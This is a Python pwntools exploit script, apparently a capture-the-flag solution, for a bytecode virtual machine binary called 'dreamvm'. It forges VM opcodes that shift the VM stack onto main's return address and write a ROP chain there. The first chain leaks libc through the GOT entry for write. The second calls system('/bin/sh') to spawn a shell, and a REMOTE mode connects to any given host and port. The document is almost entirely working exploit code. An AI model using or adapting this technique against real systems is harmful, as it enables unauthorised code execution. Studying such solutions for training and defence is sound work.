#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('dreamvm')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+402
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def stack_push():
    OP_PUSH = 0x1
    return p8(OP_PUSH)

def stack_pop():
    OP_POP = 0x2
    return p8(OP_POP)

def add_val_imm(val):
    OP_ADD_IMM = 0x3
    return p8(OP_ADD_IMM) + p64(val)

def add_stack_imm(val):
    OP_ADD_STK_IMM = 0x4
    return p8(OP_ADD_STK_IMM) + p64(val)

def write_val():
    OP_WRITE = 0x5
    return p8(OP_WRITE)

def read_val():
    OP_READ = 0x6
    return p8(OP_READ)

def forgeBytecode():
    PAD_SIZE = 0x100
    """
    - Shift stack pointer to main return address
    - Write ropchain on stack?
    """
    bytecode = add_stack_imm(48 + length)
    for _ in range(length // 8):
        bytecode += read_val()
        bytecode += stack_push()
    bytecode = bytecode.ljust(PAD_SIZE, b"\x00")

    return bytecode

def solve():
    global length

    pop_rdi = 0x400903 # pop rdi; ret;
    pop_rsi_r15 = 0x400901 # pop rsi; pop r15; ret;
    pop_rdx_chain = 0x400854 # pop rdx; pop rbx; pop rbp; pop r12; pop r13; ret; 
    ret = 0x40051e # ret;

    payload = flat(
        [
            pop_rdi,
            0x1,
            pop_rsi_r15,
            exe.got["write"],
            0x0,
            pop_rdx_chain,
            0x8,
            0x0,
            0x0,
            0x0,
            0x0,
            exe.plt["write"],
            exe.sym["main"]
        ][::-1]
    )

    length = len(payload)
    bytecode = forgeBytecode()

    io.send(bytecode)
    io.send(payload)

    libc_write = u64(io.recv(8))
    libc.address = libc_write - libc.sym["write"]
    info("libc base: %#x", libc.address)
    
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    payload = flat(
        [
            pop_rdi,
            sh,
            system
        ][::-1]
    )

    length = len(payload)
    bytecode = forgeBytecode()

    io.send(bytecode)
    io.send(payload)


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

